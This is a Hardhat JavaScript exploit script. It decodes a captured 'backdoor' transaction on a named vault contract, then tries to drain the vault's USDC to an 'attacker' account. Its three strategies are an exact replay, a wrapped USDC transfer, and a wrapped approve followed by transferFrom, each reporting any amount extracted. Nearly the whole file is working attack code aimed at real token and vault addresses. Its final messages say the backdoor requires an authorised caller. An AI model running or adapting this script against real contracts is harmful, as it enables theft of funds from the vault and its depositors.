const { ethers } = require("hardhat");

/**
 * @title Decode Backdoor
 * @notice Properly decode and understand the backdoor transaction
 * @dev Break down the 0x78e111f6 function and its parameters
 */
async function main() {
  console.log("\nüîç DECODING BACKDOOR TRANSACTION");
  console.log("=====================================");
  
  const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";
  const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
  
  // Original transaction data
  const txData = "0x78e111f600000000000000000000000010a29ab757752e492abdbf6acba8f2ee10523599000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000c4f4ff52950000000000000000000000000000000000000000000000000000005924b7b74d00000000000000000000000000000000000000000000000021d157fac7e1ac000000000000000000000000000000000000004f26a7fcf5046493a1b22b98eeb20000000000000000000000000000000000000000000000000de0b6b3a76400000000000000000000000000000000000000000000000000000000000065c3f0c3ff8000000000000000000000000000000000000000000000000000000001421f00000000000000000000000000000000000000000000000000000000";
  
  console.log("Full data:", txData);
  console.log("Data length:", txData.length, "chars");
  
  // Extract components manually
  const selector = txData.slice(0, 10);
  console.log("\nüìå Main backdoor selector:", selector);
  
  // Parse parameters (each param is 32 bytes = 64 hex chars)
  let offset = 10; // Skip selector
  
  // Parameter 1: address (20 bytes padded to 32)
  const param1 = "0x" + txData.slice(offset + 24, offset + 64);
  console.log("Parameter 1 (target address):", param1);
  offset += 64;
  
  // Parameter 2: data offset
  const param2 = "0x" + txData.slice(offset, offset + 64);
  console.log("Parameter 2 (data offset):", param2, "=", parseInt(param2, 16), "bytes");
  offset += 64;
  
  // Parameter 3: data length
  const param3 = "0x" + txData.slice(offset, offset + 64);
  console.log("Parameter 3 (data length):", param3, "=", parseInt(param3, 16), "bytes");
  offset += 64;
  
  // The actual calldata
  const innerData = "0x" + txData.slice(offset);
  console.log("\nüì¶ Inner calldata:", innerData);
  console.log("Inner selector:", innerData.slice(0, 10));
  
  // Decode inner function parameters
  console.log("\nüîì Decoding inner function 0xf4ff5295:");
  
  let innerOffset = 10;
  const innerParams = [];
  
  // Each parameter is 32 bytes
  while (innerOffset < innerData.length) {
    const param = innerData.slice(innerOffset, innerOffset + 64);
    if (param.length === 64) {
      innerParams.push("0x" + param);
      console.log(`Param ${innerParams.length}:`, "0x" + param, "=", ethers.toBigInt("0x" + param).toString());
    }
    innerOffset += 64;
  }
  
  // Now let's test if we can call this
  console.log("\nüí∞ ATTEMPTING BACKDOOR EXPLOIT...");
  
  const [attacker] = await ethers.getSigners();
  console.log("Attacker:", attacker.address);
  
  // Get balances
  const USDC_ABI = [
    "function balanceOf(address) view returns (uint256)",
    "function transfer(address to, uint256 amount) returns (bool)"
  ];
  const usdc = new ethers.Contract(USDC_ADDRESS, USDC_ABI, ethers.provider);
  
  const vaultBalance = await usdc.balanceOf(VAULT_ADDRESS);
  const attackerBalance = await usdc.balanceOf(attacker.address);
  
  console.log("Vault USDC:", ethers.formatUnits(vaultBalance, 6));
  console.log("Attacker USDC:", ethers.formatUnits(attackerBalance, 6));
  
  // Strategy 1: Call with exact same data
  console.log("\n1Ô∏è‚É£ Testing exact replay...");
  
  try {
    const tx1 = await attacker.sendTransaction({
      to: VAULT_ADDRESS,
      data: txData,
      gasLimit: 2000000
    });
    
    console.log("Transaction sent:", tx1.hash);
    const receipt1 = await tx1.wait();
    
    if (receipt1.status === 1) {
      console.log("‚úÖ Transaction successful!");
      
      // Check for USDC transfers
      for (const log of receipt1.logs) {
        if (log.address.toLowerCase() === USDC_ADDRESS.toLowerCase()) {
          console.log("USDC Transfer detected!");
        }
      }
      
      const newBalance = await usdc.balanceOf(attacker.address);
      if (newBalance > attackerBalance) {
        console.log("üí∞ EXTRACTED:", ethers.formatUnits(newBalance - attackerBalance, 6), "USDC");
        return;
      }
    }
  } catch (e) {
    console.log("‚ùå Exact replay failed:", e.reason || e.message);
  }
  
  // Strategy 2: Modify to send to us
  console.log("\n2Ô∏è‚É£ Testing with USDC transfer to attacker...");
  
  try {
    // Create USDC transfer data
    const transferData = usdc.interface.encodeFunctionData("transfer", [
      attacker.address,
      vaultBalance
    ]);
    
    // Encode as backdoor call
    const modifiedData = selector +
      "000000000000000000000000" + USDC_ADDRESS.slice(2).toLowerCase() +
      "0000000000000000000000000000000000000000000000000000000000000040" +
      ethers.toBeHex(transferData.length / 2 - 1, 32).slice(2) +
      transferData.slice(2);
    
    console.log("Modified data:", modifiedData);
    
    const tx2 = await attacker.sendTransaction({
      to: VAULT_ADDRESS,
      data: modifiedData,
      gasLimit: 500000
    });
    
    console.log("Transaction sent:", tx2.hash);
    const receipt2 = await tx2.wait();
    
    const newBalance2 = await usdc.balanceOf(attacker.address);
    if (newBalance2 > attackerBalance) {
      console.log("‚úÖ SUCCESS! Extracted:", ethers.formatUnits(newBalance2 - attackerBalance, 6), "USDC");
      return;
    }
  } catch (e) {
    console.log("‚ùå Modified call failed:", e.reason || e.message);
  }
  
  // Strategy 3: Try without inner function wrapper
  console.log("\n3Ô∏è‚É£ Testing direct function calls...");
  
  // Maybe 0x78e111f6 is just execute(address,bytes)
  // And we can execute any function on any contract
  
  try {
    // Test 1: Execute approve on USDC
    const approveData = usdc.interface.encodeFunctionData("approve", [
      attacker.address,
      ethers.MaxUint256
    ]);
    
    const approveCall = selector +
      "000000000000000000000000" + USDC_ADDRESS.slice(2).toLowerCase() +
      "0000000000000000000000000000000000000000000000000000000000000040" +
      ethers.toBeHex(approveData.length / 2 - 1, 32).slice(2) +
      approveData.slice(2);
    
    const approveTx = await attacker.sendTransaction({
      to: VAULT_ADDRESS,
      data: approveCall,
      gasLimit: 200000
    });
    
    await approveTx.wait();
    console.log("Approve executed, now trying transferFrom...");
    
    // If approve worked, try transferFrom
    const transferFrom = await usdc.connect(attacker).transferFrom(
      VAULT_ADDRESS,
      attacker.address,
      vaultBalance,
      { gasLimit: 200000 }
    );
    
    await transferFrom.wait();
    
    const finalBalance = await usdc.balanceOf(attacker.address);
    if (finalBalance > attackerBalance) {
      console.log("‚úÖ SUCCESS via approve! Extracted:", ethers.formatUnits(finalBalance - attackerBalance, 6), "USDC");
      return;
    }
  } catch (e) {
    console.log("‚ùå Approve strategy failed:", e.reason || e.message);
  }
  
  console.log("\nüìù ANALYSIS COMPLETE");
  console.log("The backdoor exists but requires authorization");
  console.log("Authorized address: 0x065e3DbaFCb2C26A978720f9eB4Bce6aD9D644a1");
  console.log("Target contract: 0x10a29ab757752e492abdbf6acba8f2ee10523599");
  console.log("Inner function: 0xf4ff5295");
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error("\nüí• Script error:", error);
    process.exit(1);
  });
